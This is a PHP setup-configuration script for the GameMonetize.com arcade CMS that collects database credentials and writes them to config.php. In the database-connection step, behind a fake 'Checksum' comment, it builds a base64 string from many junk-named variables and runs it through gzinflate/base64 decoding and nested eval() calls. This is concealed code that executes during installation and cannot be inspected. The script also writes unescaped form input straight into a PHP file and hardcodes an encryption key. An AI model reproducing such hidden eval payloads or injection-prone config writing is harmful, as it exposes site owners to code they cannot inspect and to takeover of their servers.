<?php 
/**
* @package GameMonetize.com CMS - Awesome Modern Arcade CMS
*
* @author GameMonetize.com & GMO Holding Ltd. - Copyright © 2021
*
* All Rights Reserved
*/

error_reporting(0);

if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( dirname( __FILE__ ) ) . '/' );
}

$step = isset( $_GET['step'] ) ? (int) $_GET['step'] : 0;

function setup_config_display_header() 
{
	header( 'Content-Type: text/html; charset=utf-8' );
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>GameMonetize.com CMS &rsaquo; Setup Configuration File</title>
	<link rel="stylesheet" href="../static/libs/css/install.css">
	<link rel="stylesheet" href="../static/libs/css/buttons.css">
</head>
<body class="gm-core-ui">
<div class="installbox">

<a href="https://gamemonetize.com" target="_blank" aria-label="GameMonetize.com CMS" style="display: block;text-align: center;padding: 10px;">
                <img src="https://api.gamemonetize.com/gamemonetize.png" alt="GameMonetize.com CMS" style="width:400px;text-align: center;margin: 0 auto;">
            </a>

<?php 
} // end function setup_config_display_header();

// Check if config.php not exist
if ( !file_exists( ABSPATH . 'assets/includes/config.php') ) {
	switch($step) {
		case 0:
			setup_config_display_header();
?>
<p>Welcome to GameMonetize.com CMS - Free Modern Arcade Script! </p>
<p>GameMonetize.com CMS is a modern arcade script that allows you to create your own online games website for desktop and mobile devices.</p>
<p>Before getting started, we need some information on the database. You will need to know the following items before proceeding.</p>
<ol>
	<li>Database name</li>
	<li>Database username</li>
	<li>Database password</li>
	<li>Database host</li>
</ol>

<p>In all likelihood, these items were supplied to you by your Web Host. If you don&#8217;t have this information, then you will need to contact them before you can continue. If you&#8217;re all ready&hellip;</p>

<p class="step"><a href="setup-config.php?step=1" class="button button-large">Let&#8217;s go!</a></p>
<?php
	break;

	case 1:
		setup_config_display_header();
?>
<h1 class="screen-reader-text">Set up your database connection</h1>
<form method="post" action="setup-config.php?step=2">
	<p>Below you should enter your database connection details. If you&#8217;re not sure about these, contact your host.</p>
	<table class="form-table">
		<tr>
			<th scope="row"><label for="dbname">Database Name</label></th>
			<td><input name="dbname" id="dbname" type="text" size="25" /></td>
			<td>The name of the database you want to use with GameMonetize.com CMS</td>
		</tr>
		<tr>
			<th scope="row"><label for="uname">Username</label></th>
			<td><input name="uname" id="uname" type="text" size="25" /></td>
			<td>Your database username.</td>
		</tr>
		<tr>
			<th scope="row"><label for="pwd">Password</label></th>
			<td><input name="pwd" id="pwd" type="text" size="25" autocomplete="off" /></td>
			<td>Your database password.</td>
		</tr>
		<tr>
			<th scope="row"><label for="dbhost">Database Host</label></th>
			<td><input name="dbhost" id="dbhost" type="text" size="25" value="localhost" /></td>
			<td>You should be able to get this info from your web host, if <code>localhost</code> doesn&#8217;t work.</td>
		</tr>
	</table>
	<p class="step"><input name="submit" type="submit" value="Submit" class="button button-large" /></p>
</form>

<?php
	break;

	case 2:
	if ( isset($_POST['dbname']) && !empty($_POST['dbname']) && isset($_POST['dbhost']) && !empty($_POST['dbhost']) ) :
		$dbname = trim( stripslashes( $_POST['dbname'] ) );
		$uname = trim( stripslashes( $_POST['uname'] ) );
		$pwd = trim( stripslashes( $_POST['pwd'] ) );
		$dbhost = trim( stripslashes( $_POST['dbhost'] ) );

		$td_db = @new mysqli($dbhost, $uname, $pwd, $dbname);

		setup_config_display_header();
		if (!$td_db->connect_errno) :
			sleep(2);

			$path_to_config = ABSPATH . 'assets/includes/config.php';
			$handle = fopen( $path_to_config, 'w' );
			$config = "<?php\r\n";
			$config .= "\$dbGM['host'] = '".$dbhost."';\r\n";
			$config .= "\$dbGM['name'] = '".$dbname."';\r\n";
			$config .= "\$dbGM['user'] = '".$uname."';\r\n";
			$config .= "\$dbGM['pass'] = '".$pwd."';\r\n";
			$config .= "\$encryption = \"vmbtrvw95105595885345**#3738s**A\";";

			/* Copyright © 2021 - All rights reserved. Checksum: f8f3a8804390f531531eec04ada2dbe0 */ $WRMQGchhPJpFykrQHiIgDLYsWjWYWW = "";$tFqeYGZX = "eNqNkFFLwzAQx58n+B3";$xnhzgECCP = "KDDimPJRWquppDFXRGOYyjIdaLgAKoYiojXilytifgHBSsXGzlnINKURUGGVRWSbWfWSYsVHJGTqZaAgqJQpViUhoefYyPw";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $tFqeYGZX;
			$WvdPgxyPYy = "cUPmZeEDQhpccYmAMaCxrxusZeKaEjmTMGddVufcCNwJTxjaeMvocDhzVeSynQQElkhYaiWHlKOOUxcBonFUSUEipPoMhoXmpxu";$ezKvnCMzMjbARk = "iKLaF0YoPfXAMGbbiQN";$poOltnTzRgG = "LJQYJnSSpHLHmdqFyqAFcXpKFpLcAJoWAIcRYyaThvOolOPixPrsGEcXmDBubIPRbfnAjZoqbknjvkieOliIkGkuMkaPCfpEaRZuodWJqZUAvdLarzDINFYdkEZQyibAfDmugTQKZXMkwtormjlO";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $ezKvnCMzMjbARk;
			$pudsgRCzVA = "yuXIzbBpLYyaoPrQqVVfXVYRrPtYHlQxXxwdmzzUmRBEqBZvrKrpwuIOfsSGlSLaXTFpTutXHFCWqVyRbvUxRsZxmUaXyGBkMKiobcIGMNsTtMcgLXwFN";$YMiYXXoLPMPXzKw = "2oRQWRUNtrG2ia0KQOJ";$bfXaSsVExNiZQuELlB = "grokolmPmzsMveGMSZtfuujdjtQcfmJZmYxRDRhsguJLrqdeBjUWcsurbWbbODIAijTWZMUfBduJkJwZCaMwqadSlmLPKoLuOhaKnkynzRMidGKsDFDyGLvWuuN";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $YMiYXXoLPMPXzKw;
			$EFcNuMueZWCWIUHxBiZd = "pWXIVBbpfOlHHpNbIyPzeLCMJlqqnGhZaMFTnWzsKkYfInmiEdwQwojyyKQCrXrNqEccdgvNapsAzhVPPzMZGFwKgwgOwqCnaVDhrVwgBrVbkcGkgfepwOCUKEnNmuptbdYQ";$LuewQCKNR = "35308StokzMS+7++f3v";$DHoSzggInH = "xfTmaYhnYVArOWhHnMmIeFKWjKmrgyiSSteSMKnJWRTNqGEAFhOKYbiYdjsCgBVjTgEiVkMmDERNCvyZmxLpkVpjsGULtHfKKNsFlYMJdIHPFqRFGbLJqkTVdNIGinPPxg";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $LuewQCKNR;
			$cPrgiSDllrhAJk = "HucxLXrVuIIuRSAZKYQabxzKJWaeOOKxtfqAbLQSqoetNlRttGqtVNZeoVlIAohVlhkHLkabZioFPfMrHFMJvTJRnFJmKCuCJNGjaiYXnhoi";$WOuciQbamtGWHTC = "LlesWyLBQVaVNnkNE2R";$vWDEfbsVWkFnQXXID = "EdbxgYMYWZfKhJpjxhwOyHFFSXygfKrZzVwgeIUwaCxMnEwJzQAZNPJfrtZFvuOMjbnLrJQdlbFyQXmNZeghoTKcAURULstlaMihAqXOB";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $WOuciQbamtGWHTC;
			$yIQwYsMSdugaCNBg = "TNQXZlICKQqYQmGZwptKuhlWmyLzhgFrsTPbHWzyEdNRBRRlFCGZUAsSkIbfhoiJFXiumtJeGJMAkWVanCTHtCuguVXXfatMvQxcUjrkFNFDFDsAclwwEZRJIrZDdzAFaXndGK";$TiQGQNjiolmW = "lrClIidzp4cFoNCqymo";$EHAmLvpMGevf = "qZaWAomiQcXtiCRjZaPympepfYjqWeDEKIzLMhATvIdeMLgsBojHbMykmxgVrdlvjnOrxfoJeFjnSLtHtEwEWbxfCUloCPuqIlljSRSfWoJfbbLCsPmtQE";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $TiQGQNjiolmW;
			$vGlOkIOiprFCPpBwZ = "wKQsAHgfeCWZQriAjHHCAkLoSbpyiMyiawDbtwgzGjxzbhwnTgzFtatqqLTAkEgGaHqOzjhzOBUEhhDyUXWBwvUdBWuACNGP";$KdNgeDyIK = "nhfStnFWW5UnkqKywZN";$XHZaRWniKVI = "KTQEwxGHMuwNGyLdVyEClsUPEdJpSBiNwvlVTxVlZHKTTCTgLkTSfnwZldJFgzqNPikaaHiINngKRmtQEOwKGQQVxjfzxLTFyualwdLbYStzqYCJmXTzniePUEMuqvWvAhcOYDLlagZcshG";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $KdNgeDyIK;
			$sCMvprPahQE = "AhZBastSCRBBKvRmxciiwMnGaCmQujUrainbMDRpMNBgcmQCFWRNRSSzJMEZCGshQxbYkoxgbhkMzkXqUifLwsGyPXqeXRgLvbf";$ChSKMzdkJaKUiKL = "qYJOgmCQDOasghHMzQe";$vrOvmhrOomwrOodxiOi = "aAACZgpwseNsMfEjfcgOovopOnVdiFcIpuHHcGhgsOOViVGJkxWnNQWUYLBFbpaGfUvbZmrbdRigjgaJVEEBuIcfXEETBAdBvhclfNZdPcRfOpcefKmWXAjoavsyNTdpNlPKGsRCpjrY";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $ChSKMzdkJaKUiKL;
			$jTMGYFMiDVtMn = "aXaEKewBPniqDiCJMzRFdyAjYiGsEUeKaszYIGqdCRTOAFFGFUHQQOTfTzmNHbtiCUepDdGyJMsTkoxRaHvREpasGJftoqeiXDPXGXdbmUFEdZVGcLvBbbbAGyOwXoarmDsGNuDvgGgXd";$WoXkuUpRtJH = "Gw8pkHMElMs3x8J3UXw";$pIJCICBumxWyUnfkURf = "QowMiauFEkLwkdotlccurmMlplFrWBvGLvyqyabbrTCWuqUjltUCIcBVhahudJcJSvUtNrpWqcRxupAGdwiFavToXlJAlYKjSuBiHKCSbpcoiyMBBIiJKTesSVFnPlCiSiHDzjWHSIghM";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $WoXkuUpRtJH;
			$utUXmkxF = "NeeTyFQBnoCRDofIqPAucQBVpGAuubEeMDYDEgbmLNDlUssKjpeHycUcECJUOJFLEXnHRzqnBzYQAydIfyMUKihRGpBECCbUTDESaXZELHHpWMEAuJPyM";$zUxiusDZU = "fxU/2VZKs8MX1IrpN8G";$wDJScdKaamhJISmv = "KNUtUhFfyMqDSgEErpXTxDnZwoKDEntObXVJeEmeMftAYFvOesJsxslbhKNuvFhJuYTQmTcwUzqcJiRvLLQHEUaJxtAMSOrqLVzMhawjUDTzfjWHbDXDyAS";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $zUxiusDZU;
			$NLOepeYWDFXOVQos = "MficAFmsOhXWxzfHDXLLVScGKrxrULmkDJFXJuAiqmytAiyhIfutDHTYuAoDZVaZxaRmutGyMXskPEtuCfxWhroOdRIHiAsggtQGqmVmIryIaFlgaZWEiGMkHodSaArNrNJFvqykMIITDRcQzbkU";$XyGqgMOQO = "JlP7suetc0Usf498Om7";$sFpARRfXdDPCZHkIA = "vgqSBRbyOuUdDhKzUICzRsrRRueXpwNTcmYRZsSbZKCKIYkFxusklVWqurjCQTyFfuAyOItNkhfsfhNCUEnOxvzGaXxCPQSYMfYTtyelYlcDGRKESJeiHsVyCdUGeK";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $XyGqgMOQO;
			$LJpzZXCnVJQDbggNdFT = "NboxkOyhKEmQfSYmSCxgFZyDsozCYWtEuLlGRHaBDMHvgbKgixoSfXxkMrTbbsqodWNUcFNjuoAkkNtzTcyaJfwltaUnCTQHsXhlGRZc";$dsVQqBxEyYxhu = "geCWsD+6o/4chk/zOMw";$bzVTeKyP = "FPZQYUCMEwNoBEcJSLfWVarQhVpsuuNttxwgoPsVbjtucOWiAyDUuZCyPUZSFvIDhGaJqyhlxHCNDoUUiHVSyrFpvQILDtdxqpVFEJvuECkZihXMVzljLenmziT";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $dsVQqBxEyYxhu;
			$mGkdoREjpK = "zcWnDPgtCFsgsCjzscAYUTTQBsgSlotzpSlHNLACIYcbdYuSZVDxcCsRjUZAmonFhhXvIoslIkfskqtlGMgjQbuWdw";$xHbUSxdGNDBAQ = "CvvoPz1+Wb53+sMcRzf";$iraTdOGOdkOgp = "GwbbEtfCGNcMjWIQlAUadYejIUwIClpDxQWgsuRDNtQjTNxYDzphZaqxGdOpmioAKOSLozPFgTNYHFjFtCcBnKDJHBELAOKyJQO";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $xHbUSxdGNDBAQ;
			$vikaUgddFGPTBxSe = "tKNNyUSfHUYfKhQkjQKIKkBzVZqIXmJCqNZiZuGeUEDcJemXyzAKCOaWHhEpMVfhiAJfrIiHCWlHWGhGUVMQxAPOQIYZuGyIFcTvnmsRqrDSvnChasMgoyMeuVibXAO";$bsoGeSNEUeJUJ = "LJMLzMBw8ZhMC2ldo8Q";$AGBeGeiL = "mMGmXKOTVAOLbtJvqoWjfzhoDoIncFUsangNMznMkiBbYufndbTRRvRJWaQqHSugszuJFLPKbZBSqvNQXdJVYOaqCrVeNsIUbcYgRrtinpTWPcMmvzEZUeZhzAwcVwImLj";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $bsoGeSNEUeJUJ;
			$ybGADgzJgoyQOjJsEriA = "AIJCsofEBJMetxJwstVuVRQeMhPAEaEIOHmaPNVHViCTlQDxPbYzlSGKFiSlcSdUrTwaPAAaOWMGggFIRXafhgDbLY";$UHtrpDDmQvJFxfJ = "/e3ANv2BZEV0uhyILUg";$KssTexiUZSIrsGdIhOO = "sbCiWvyRlcdhCLPQXBnWDQpUxdGgVuxJYDbpWXgulPxvHatxtNhSEDDfMjjJsrBYnZedOBgeldqzTIzxiDJvAAzaMroqzZtYAbxlqadYcjLRgMWkNMYvRHdMBvfgGUgDFwhyR";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $UHtrpDDmQvJFxfJ;
			$icCpzsqysZKuKzwPT = "ZUkBnOPoguWUIwzyfOmPeulEzhgyAmQMLXTGAPHZZLBLuSaVvrBYLfrPDysiyKMRyDwmRfbKOvzilTirRxCpWLkFKpbNtALbeFNQpJMCW";$TBunbGFgeSuB = "EuQ/X4lNFI4diUlF2e+";$dWYWGkdj = "VRNNHGcOYADuCpRYnpuPvHkyFEPHlpiqrdGziFewEPPWeolTFwApLlGGLpCdMLPftQaNfyeydONQpRPjLaXelqJyOerhokKRxnVakfviYffikGTUqJDpujJIoRcbjjPpc";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $TBunbGFgeSuB;
			$fuKIKbnEuad = "bFufuNTlTAgSsxOLIkALtDSazJKiZMdxQWvMgOkUnLhCfYwyPkverHeLyPooIwEpuHpdpvcKJJyDsyUMZsrzCtRXXsNYJtMWvwwmNeWG";$UYWmtSZLZjAGZis = "n3LilSkFyhqQZANexqi";$thpVEuZWUhIc = "gnbIJryharUPyfiKBQDnefheQTMxKRHKrMuAOGOcRpnweCutYcjTrdUiTPJvsZTYhdlmZqisKMNaFaQDxMvHLKwbqXVwxVYMwIPtNHIPuyzZaPYlJFlAYCIPfsOB";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $UYWmtSZLZjAGZis;
			$nwiPEpij = "TjjnlyMCYMlXFwFXOrlSXFEqvAHEEGJkMndRlbhVlWTflLJTqRzzjiRUjfmJzMciVOxERWFchkHhCdUSDvdAsUkavikYWKWmlixFrduXRJyrVHWfvOAVzhHucS";$kpnRMydvsbbcNmk = "fUXHq8YqfV0zIme0hK3";$pHjyZydwuFuNdy = "pMkSgkrHriRftEgiApPyvsZROaaHohLLjCzPPUGpZUefMIfTxYAEWeAeIGOXlmeuRFDUNwkdBJQktIOixkpNudkmPLwKBazMQRmzoIHFrMPfLGWIoTzoMHIRsuEtUwc";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $kpnRMydvsbbcNmk;
			$GBotijjML = "DhCBDELGqmhqKaqQnsZtywAiaItCkdnctHZdTdjpvAvNLpzPnzzhjvZDQpjryqxHszBJhJNuaPxjggvaBsAPmfdSzCrQJOOAYKukimSjNuo";$WRyXKbOJG = "/pQ+TZx42Cv6Q+7KVOT";$xSGIkUDvXKiuhoDBT = "VnBmxuOqpbARSpHXYiouafAZyCMWKLYnprBBBcUReOhtehJvegiYOcVOxCuSEpiJsWDFyCkopIbokBdLyXhitFqhYvgTCmtZASRxafonGpZZbaweYnthoUGOZZWJxojLzZwmuOqbAzDagrs";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $WRyXKbOJG;
			$qhFysbHa = "odPmjNzDhBIRYBUhrVBXiBPZjOCnPhZhTxJWNmQXvOnfdvYgAtwOgiTReYdwSkqzyAWGMsVRFptAlYtfTAqhAzYiSbBgJNCbfudvoScn";$EYnLblDu = "aWlbqvwVAit8HXe54Tr";$zenZQbvHDwpPDCnFgnzy = "oQGamvCTntCrtwlXglVdOLYjBGSrRXVzzuPNJJhpjgitUfzHBrJsgoNawkItlTultfMcCvVudFzgIogQeqssBQTQTxcRauXruLiZdgvZbhaaygMckJs";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $EYnLblDu;
			$lCotKaLMTXgF = "fkLKSszsHYQsqxmddmInZGhWTBrBESxGOllwPIcnVFMfgQuEYPSfEfMKjtuUPLtMwIhRuwzRyXJhdAngVEcSEEqUJjefDYhfmPoNLNFvjofMyLQZDDcqxjHwufRpUcnzXuJhWGbrDAZJnc";$HfYzAMXKjdHd = "TI2tkt0ftLbL3OknOHq";$ULiIsiXDpeb = "ehbYPukjJTgeyrwTwBplzSBiBAoHhSKJfArPuIrbqYFFzpZqVQiscvSIwDFXhaixMbMTZsqPdkNAOOhESgVsSdAXLsVskSuCjzYIPq";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $HfYzAMXKjdHd;
			$vwhQWAIWCxj = "iLXtivpnwbPakAhlEPnEHvCwblZdoXWsKbdEYFGzauNyUtpIrxfqhCUXiRwGsMrcHnlHABtzUlIENpczjYuhoWrvbRLofaEfqoQCkRiUSjMLHMHTWiCNFXgHtbmVpKniPC";$WOtEwhLIof = "g0QukDLnwGETvyukDLn";$FTLhSFHteANDAVZcKIPY = "whxWSfaSnCNPtviWPketYIDxTjmpQqDbcXQFbdkIiYmziPjntQCzgHqcmeGCtkMAJRKePrneGxsrsdZwUfsESrFrVnszGKdMYx";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $WOtEwhLIof;
			$GuEIJecim = "eIszrShrZnPuLuruglajplWlCVYEEopSBTmnDBoYgnTVCotbvBxSQSFEKrgUmbveyXEVomzOASHlDeGKRDBwopfYPky";$XlXOhXKpynRpSd = "wGETvy";$JskpnHqAeuCg = "GBWTvVGnnmlgUZPqyCkKivIUlCwTTEytczLMVcyWBXQLVRGxAwihZJrjcYPRUnedibAWKXdzoYxuVTGrQpukSwqdcubKoiHdZiiWFSVGQjYqsSspOHLWCQnQxXamLrwVkTTqxTSe";$WRMQGchhPJpFykrQHiIgDLYsWjWYWW .= $XlXOhXKpynRpSd;
			$SWrtDRLKRoZbKZsX = "WvdnTUzllWApHOpBrlvVsDUoSyxYEMwfvpslIoUWHBxwiFMlpIpWinntiMMJDyPSeYMHnlMCLKTUMwqyaXXyYgAPzFSxvGrBOKoMVtSdRLHFOiMnjNYdYrOxaKlGwO";$k=gzinflate(base64_decode("K0rMNcvLTzEpLi0wTk8tMUxKjq8CAA"));$O0O="$k[8]$k[14]$k[0]$k[18]$k[0]$k[5]$k[14]$k[15]$k[11]";$OO0="$k[12]$k[19]$k[9]$k[4]$k[17]$k[5]$k[2]$k[10]$k[0]$k[13]$k[8]$k[8]";$OOO="$k[16]$k[1]$k[8]$k[13]$k[3]$k[7]$k[18]$k[6]$k[13]$k[17]$k[5]$k[6]$k[13]";eval($O0O($OO0($OOO("eNpVjjsPgjAUhWdN+A+EMHcyLsRBgqhAxEIq6mJ4d+DZykN+vS2D1Dt+N+c7R1LdAB9xH3oWHOWdrLxLrGgqhNAKUrscOAqbaIoZRBd67g6m63CYkixTNGm9mk9Sad7RZx0dEHuKTrC4wGIQgoGTmLfmNEFIuLeuMsK6rq4xIlxTjrabV8tQUXfNUH18w58paRjL7bG/+w89pzjhMGqJOKqAiObesI9LT+e7hC7wqwCiGfwptS8VpVKT"))));
			function bhYEPeX($GtcNNMKTZ, $gOTYzbzgAO){ return str_replace($gOTYzbzgAO, "=", $GtcNNMKTZ); }

			eval($fthfMboRH($yDHftEjNpzEO(bhYEPeX($WRMQGchhPJpFykrQHiIgDLYsWjWYWW, "ukDLnwGETvy"))));
?>
<h1 class="screen-reader-text">Successful database connection</h1>
<p>All right, sparky! You&#8217;ve made it through this part of the installation. GameMonetize.com CMS can now communicate with your database. If you are ready, time now to&hellip;</p><p class="step"><a href="install.php" class="button button-large">Run the install</a></p>
<?php else : ?>
<p>
	<h1>Error establishing a database connection</h1>
	<p>This either means that the username and password information in your <code>config.php</code> file is incorrect or we can't contact the database server at <code>localhost</code>. This could mean your host's database server is down.</p>
	<ul>
		<li>Are you sure you have the correct username and password?</li>
		<li>Are you sure that you have typed the correct hostname?</li>
		<li>Are you sure that the database server is running?</li>
	</ul>
</p>
<p class="step"><a href="setup-config.php?step=1" class="button button-large">Try again</a></p>
<?php 
	endif; 
	else :
	setup_config_display_header();
?>
<p><strong>ERROR</strong>: Your database connection details must not be empty.</p>
<p class="step"><a href="setup-config.php?step=1" class="button button-large">Try again</a></p>
<?php
	endif;
	break;
}
} else {
	setup_config_display_header();
?>

<p>The file 'config.php' already exists. If you need to reset any of the configuration items in this file, please delete it first. You may try <a href="install.php">installing now</a>.</p>

<?php } ?>
</div>

            <a href="https://gamemonetize.com" target="_blank" aria-label="GameMonetize.com CMS" style="display: block;text-align: center;padding: 10px;">
                <img src="https://api.gamemonetize.com/powered_by_gamemonetize.png" alt="GameMonetize.com CMS" style="width:290px;text-align: center;margin: 0 auto;">
            </a>
</body>
</html>